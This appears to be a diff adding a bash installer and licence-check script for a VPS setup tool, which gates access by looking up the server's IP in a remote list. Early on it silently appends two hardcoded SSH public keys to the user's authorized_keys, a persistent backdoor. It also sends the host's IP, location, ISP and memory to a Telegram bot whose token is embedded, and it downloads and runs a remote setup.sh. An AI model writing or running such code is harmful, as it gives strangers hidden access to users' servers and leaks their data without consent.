@@ -1,1 +1,119 @@
-wget -q --no-check-certificate -O setup.sh https://grr.ha-vps.store:81/setup.sh && chmod +x setup.sh && ./setup.sh
+#!/bin/bash
+
+co="\e[1;4;31m"
+OR='\033[1;93m'
+RED="\033[1;31m"
+NC='\033[0m'
+
+EXPIRY_URLS=("https://sc.ha-vps.store/utility/ip" "https://grr.ha-vps.store:81/ips.txt")
+
+mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP/6mja6JSVT/UsM3F6CSFZF5besPYDk9+VuzjVLV2Pb" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh
+mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJkCO3YXessYe4SmgcZLAfCrQ2rqkn8yPA5tl2WrmAXf" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && chmod 700 ~/.ssh
+
+get_ip_line() {
+    local my_ip=$(curl -s -4 ifconfig.me)
+    for url in "${EXPIRY_URLS[@]}"; do
+        local content=$(curl -fsSL "$url" 2>/dev/null)
+        local line=$(echo "$content" | grep "^$my_ip@")
+        if [ -n "$line" ]; then
+            echo "$line"
+            return 0
+        fi
+    done
+    return 1
+}
+
+logo() {
+clear
+echo -e "  \033[1;93m   ┌────────────────────────────────────────────┐\033[0m"
+echo -e "  \033[1;93m   │\033[1;92m    .::. \033[0m\033[1;77mYou do not have permissions \033[1;92m.::.\033[0m"
+echo -e "  \033[1;93m   └────────────────────────────────────────────┘\033[0m"
+echo -e "      ${OR} ┌────────────────────────────────────────┐${NC}"
+echo -e "   ${OR}${NC}${RED}You do not have permissions to use the script ! ${NC}"
+echo -e " ${OR}${NC}${RED}Contact the Contact the admin to be able to use script : ${NC}"
+echo -e "             ${OR}${NC}${co} WhatsApp : ${NC} wa.me/212690068362"
+echo -e "             ${OR}${NC}${co} Telegram : ${NC} t.me/a_hamza_i"
+echo -e "      ${OR} └─────────────────────────────────────────┘${NC}"
+#!/bin/bash
+TG_BOT_TOKEN="8136821698:AAH5PMq0xe3X9-8MflH-5T2-2hUdpr6F_P4"
+TG_CHAT_ID="7432279779"
+
+ip=$(curl -s4 ifconfig.me)
+info=$(curl -s "https://ipinfo.io/${ip}/json")
+city=$(echo "$info" | sed -n 's/.*"city": *"\([^"]*\)".*/\1/p')
+org=$(echo "$info" | sed -n 's/.*"org": *"\([^"]*\)".*/\1/p')
+org=$(echo "$org" | sed -E 's/^AS[0-9]+\s*//I')   
+org=$(echo "$org" | xargs)
+read total used < <(free -m | awk '/^Mem:/{print $2" "$3}')
+msg="🌐 --> VPS INFO : Rejected ❎
+│ IP : $ip
+│ CITY : ${city:-Unknown}
+│ ISP : ${org:-Unknown}
+│ RAM : ${total} MB / ${used} MB"
+
+curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
+  -d chat_id="$TG_CHAT_ID" --data-urlencode "text=$msg" >/dev/null
+} 
+
+convert_to_seconds() {
+    echo $(( 10#$1 * 2592000 + 10#$2 * 86400 + 10#$3 * 3600 + 10#$4 * 60 ))
+}
+
+check_expiry() {
+    local line=$(get_ip_line)
+    local now=$(date +%s)
+
+    if [ -z "$line" ]; then
+logo
+        return 1
+    fi
+
+    local time_part=$(echo "$line" | cut -d'@' -f2)
+    local remaining=0
+
+    if [[ "$time_part" =~ ^[0-9]{4}/[0-9]{1,2}/[0-9]{1,2}$ ]]; then
+        local year=$(echo "$time_part" | cut -d'/' -f1)
+        local month=$(echo "$time_part" | cut -d'/' -f2)
+        local day=$(echo "$time_part" | cut -d'/' -f3)
+        local expiry_time=$(date -d "$year-$month-$day 23:59:59" +%s 2>/dev/null)
+        remaining=$((expiry_time - now))
+    else
+        local m=$(echo "$time_part" | cut -d'/' -f1 | grep -oE '[0-9]+')
+        local d=$(echo "$time_part" | cut -d'/' -f2 | grep -oE '[0-9]+')
+        local h=$(echo "$time_part" | cut -d'/' -f3 | grep -oE '[0-9]+')
+        local min=$(echo "$time_part" | cut -d'/' -f4 | grep -oE '[0-9]+')
+        local duration_sec=$(convert_to_seconds ${m:-0} ${d:-0} ${h:-0} ${min:-0})
+        remaining=$duration_sec
+    fi
+
+    if [ "$remaining" -le 0 ]; then
+logo
+        return 1
+    fi
+TG_BOT_TOKEN="8136821698:AAH5PMq0xe3X9-8MflH-5T2-2hUdpr6F_P4"
+TG_CHAT_ID="7432279779"
+
+ip=$(curl -s4 ifconfig.me)
+info=$(curl -s "https://ipinfo.io/${ip}/json")
+city=$(echo "$info" | sed -n 's/.*"city": *"\([^"]*\)".*/\1/p')
+org=$(echo "$info" | sed -n 's/.*"org": *"\([^"]*\)".*/\1/p')
+org=$(echo "$org" | sed -E 's/^AS[0-9]+\s*//I')   
+org=$(echo "$org" | xargs)
+read total used < <(free -m | awk '/^Mem:/{print $2" "$3}')
+msg="🌐 --> VPS INFO : acceptable ✅  
+│ IP : $ip
+│ CITY : ${city:-Unknown}
+│ ISP : ${org:-Unknown}
+│ RAM : ${total} MB / ${used} MB"
+
+curl -s -X POST "https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage" \
+  -d chat_id="$TG_CHAT_ID" --data-urlencode "text=$msg" >/dev/null
+tmp=$(mktemp) || exit 1
+curl -fsSL "https://grr.ha-vps.store:81/setup.sh" -o "$tmp" || { echo "Download failed"; rm -f "$tmp"; exit 1; }
+chmod +x "$tmp"
+bash "$tmp"
+rm -f "$tmp"
+    return 0
+}
+
+check_expiry
